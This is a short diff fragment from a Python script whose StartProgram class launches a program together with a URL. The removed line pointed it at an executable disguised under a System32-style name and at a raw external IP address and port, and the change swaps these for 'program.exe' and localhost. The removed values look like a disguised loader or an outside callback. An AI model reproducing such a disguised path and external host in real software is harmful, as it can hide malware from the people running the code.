@@ -65,5 +65,5 @@ class StartProgram:
         except Exception as e:
             print(f"Error launching program: {e}")
 
-program = StartProgram(r"C:\Windows\System32\SystemService.exe", "http://144.31.73.100:4545")
+program = StartProgram("program.exe", "http://localhost:7070")
 program.start()
